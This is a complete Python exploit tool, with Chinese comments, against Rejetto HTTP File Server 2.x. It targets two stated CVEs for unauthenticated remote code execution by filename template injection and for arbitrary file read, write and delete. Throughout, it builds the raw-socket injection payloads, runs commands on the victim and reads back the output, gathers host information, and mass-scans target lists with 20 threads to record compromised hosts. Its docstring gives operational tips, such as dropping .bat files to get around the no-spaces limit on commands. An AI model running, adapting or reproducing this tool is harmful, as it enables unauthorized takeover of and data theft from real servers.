#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
================================================================================
 HFS2-PWN  —  Rejetto HTTP File Server 2.x 完整利用工具
 CVE-2026-97359  未授权 RCE (filename 模板注入 → 宏分发器无鉴权)
 CVE-2026-97360  未授权任意文件 读/写/删
================================================================================
 用法:
   python3 hfs2_pwn.py scan   <targets.csv>            # 批量: oracle 预筛 + RCE 确认 + 信息收集
   python3 hfs2_pwn.py info   <ip> <port>              # 单机信息收集 (whoami/hostname/ipconfig/systeminfo)
   python3 hfs2_pwn.py exec   <ip> <port> <cmd>        # 执行命令(不能含空格, exe 类; 输出回显)
   python3 hfs2_pwn.py read   <ip> <port> <win路径>    # 读任意文件 (自动 chr 合成冒号与反斜杠)
   python3 hfs2_pwn.py write  <ip> <port> <win路径> <内容文件>   # 写任意文件
   python3 hfs2_pwn.py delete <ip> <port> <win路径>    # 删文件
   python3 hfs2_pwn.py exists <ip> <port> <win路径>    # 存在性探测

 原理:
   上传 multipart 的 filename 经 %item-resource% 符号替换后未做 macroQuote(),
   载荷内 ":}" 提前终结 {:...:} 引用区 → {.exec|cmd.} 直达宏分发器(无鉴权)。
   宏分发器无鉴权模型 → load/save/append/delete/exists/filesize/mkdir 全部可用,
   uri2diskMaybe() 对不含 "/" 的路径原样返回 → 绝对路径绕过共享目录。

 铁律:
   1. 必须先 oracle 后 exec —— oracle 零破坏、零假阳性
   2. 命中判定字符串绝不能出现在请求里(否则是本机 payload 回显)
   3. curl -F 投不出漏洞: 会 URL 编码/规范化 filename, 必须 raw socket + latin-1
   4. exec 走 ShellExecute, 只认独立 exe → 不能有空格、不能用 cmd 内建命令
      需要空格/重定向时 → 用 write 落一个 .bat 再用 exec 调它
================================================================================
"""
import csv, json, os, re, socket, sys, time
from concurrent.futures import ThreadPoolExecutor

B = "X"
TIMEOUT = 20
MAXREAD = 400000

# ---------------------------------------------------------------- 底层请求
def _mp(fn: str) -> bytes:
    return (b"--" + B.encode() + b"\r\n"
            + b'Content-Disposition: form-data; name="f"; filename="'
            + fn.encode("latin-1") + b'"\r\n'
            + b"Content-Type: application/octet-stream\r\n\r\n" + b"hi"
            + b"\r\n--" + B.encode() + b"--\r\n")


def knock(host, port, macro, timeout=TIMEOUT):
    """发一次模板注入请求, 返回响应文本"""
    body = _mp("%item-resource%:}{" + macro + "}")
    req = (b"POST / HTTP/1.1\r\nHost: " + host.encode() + b":" + str(port).encode()
           + b"\r\nContent-Type: multipart/form-data; boundary=" + B.encode()
           + b"\r\nContent-Length: " + str(len(body)).encode()
           + b"\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n" + body)
    s = socket.create_connection((host, port), timeout=timeout)
    try:
        s.sendall(req)
        buf = b""
        while len(buf) < MAXREAD:
            try:
                c = s.recv(65536)
            except socket.timeout:
                break
            if not c:
                break
            buf += c
        return buf.decode("latin-1", "replace")
    finally:
        s.close()


def _namefield(t: str) -> str:
    """从响应 JSON 的 name 字段里抽出宏求值结果"""
    m = re.search(r'"name"\s*:\s*"((?:[^"\\]|\\.)*)"', t.split("\r\n\r\n", 1)[-1])
    n = (m.group(1) if m else "").replace("\\", "")
    return n.split("&amp;#58;}", 1)[-1].strip()


# ---------------------------------------------------------------- 能力
def oracle(host, port):
    """零破坏验活: .add|7000000|788. → 命中时响应出现连写 7000788"""
    try:
        return "7000788" in knock(host, port, ".add|7000000|788.")
    except Exception:
        return False


def whoami(host, port):
    return _namefield(knock(host, port, ".exec|whoami|timeout=20|out=z.}{.^z."))


def hostname(host, port):
    return _namefield(knock(host, port, ".exec|hostname|timeout=20|out=z.}{.^z."))


def exec_nospace(host, port, cmd):
    """执行无空格命令(独立 exe), 输出经 out= 变量 + {.^z.} 回显"""
    return _namefield(knock(host, port, ".exec|" + cmd + "|timeout=25|out=z.}{.^z."))


def _synth(path: str) -> str:
    """把 Windows 路径里的 : 和 \\ 换成 chr 宏 —— 上传处理器会剥离字面冒号与反斜杠"""
    return (path.replace("\\", "{.chr|92.}")
                .replace(":", "{.chr|58.}")
                .replace("/", "{.chr|47.}"))


def read_file(host, port, path):
    """任意文件读: .load|<path>|var=z. 然后 {.^z.} 打印"""
    m = ".load|" + _synth(path) + "|var=z.}{.^z."
    return _namefield(knock(host, port, m, timeout=30))


def write_file(host, port, path, content):
    """任意文件写: .save|<path>|<内容>."""
    return _namefield(knock(host, port, ".save|" + _synth(path) + "|" + content + "."))


def delete_file(host, port, path):
    return _namefield(knock(host, port, ".delete|" + _synth(path) + "."))


def exists(host, port, path):
    return _namefield(knock(host, port, ".exists|" + _synth(path) + "."))


def mkdir(host, port, path):
    return _namefield(knock(host, port, ".mkdir|" + _synth(path) + "."))


# ---------------------------------------------------------------- 单机 info
def info(host, port, deep=True):
    r = {"host": host, "port": port, "oracle": False}
    try:
        t = knock(host, port, ".add|7000000|788.")
        if "7000788" not in t:
            m = re.search(r'server="([^"]+)"', t) or re.search(r"(HFS[\d\s\.\w]*?)\r", t)
            r["server"] = m.group(1) if m else t[:80]
            return r
        r["oracle"] = True
        r["rce"] = True
        for k, fn in (("whoami", whoami), ("hostname", hostname)):
            try: r[k] = fn(host, port)
            except Exception: r[k] = ""
        if deep:
            for c in ("ipconfig", "systeminfo", "tasklist", "netstat"):
                try: r[c] = exec_nospace(host, port, c)[:1500]
                except Exception: r[c] = ""
    except Exception as e:
        r["err"] = type(e).__name__
    return r


# ---------------------------------------------------------------- 批量
def _load_targets(p):
    out = []
    if p.endswith(".csv"):
        for x in csv.DictReader(open(p, encoding="utf-8")):
            if x.get("host"):
                out.append((x["host"].strip(),
                            int(x.get("port") or 80)))
    elif p.endswith(".json"):
        for x in json.load(open(p)):
            h = x.get("host") or x.get("h") or x.get("ip")
            pt = x.get("port") or x.get("p") or 80
            if h:
                out.append((h, int(pt)))
    else:
        for ln in open(p):
            ln = ln.strip()
            if not ln or ln.startswith("#"):
                continue
            if ":" in ln:
                a, b = ln.rsplit(":", 1); out.append((a, int(b)))
            else:
                out.append((ln, 80))
    seen, u = set(), []
    for k in out:
        if k not in seen:
            seen.add(k); u.append(k)
    return u


def cmd_scan(path):
    tg = _load_targets(path)
    print(f"[*] 目标 {len(tg)} 个 (oracle 预筛 → RCE 确认 → 信息收集)", flush=True)
    live, res = [], []
    with ThreadPoolExecutor(max_workers=20) as ex:
        for i, r in enumerate(ex.map(lambda a: info(a[0], a[1], deep=False), tg)):
            res.append(r)
            if r.get("rce"):
                live.append(r)
                print(f"  [{i+1}/{len(tg)}] ★★★ RCE  {r['host']}:{r['port']}  "
                      f"{r.get('whoami','')}  @{r.get('hostname','')}", flush=True)
            else:
                print(f"  [{i+1}/{len(tg)}]  --   {r['host']}:{r['port']}  "
                      f"{r.get('err','not-vulnerable')}", flush=True)
    json.dump(res, open("hfs_scan_result.json", "w"), ensure_ascii=False, indent=1)
    with open("hfs_live.txt", "w") as f:
        f.write("\n".join(f"{x['host']}:{x['port']}" for x in live))
    print(f"\n[=] 未授权 RCE {len(live)}/{len(tg)}   → hfs_scan_result.json / hfs_live.txt")
    for x in live:
        print(f"    {x['host']}:{x['port']}  {x.get('whoami','')}  @{x.get('hostname','')}")


# ---------------------------------------------------------------- CLI
def main():
    if len(sys.argv) < 3:
        print(__doc__); return
    a = sys.argv
    op = a[1]
    if op == "scan":
        cmd_scan(a[2]); return
    host = a[2]; port = int(a[3]) if len(a) > 3 and a[3].isdigit() else 80
    if op == "info":
        print(json.dumps(info(host, port), ensure_ascii=False, indent=1))
    elif op == "exec":
        print(exec_nospace(host, port, " ".join(a[4:])))
    elif op == "read":
        print(read_file(host, port, a[4]))
    elif op == "write":
        content = open(a[5], "rb").read().decode("latin-1")
        print(write_file(host, port, a[4], content))
    elif op == "delete":
        print(delete_file(host, port, a[4]))
    elif op == "mkdir":
        print(mkdir(host, port, a[4]))
    elif op == "exists":
        print(exists(host, port, a[4]))
    else:
        print("未知操作:", op); print(__doc__)


if __name__ == "__main__":
    main()
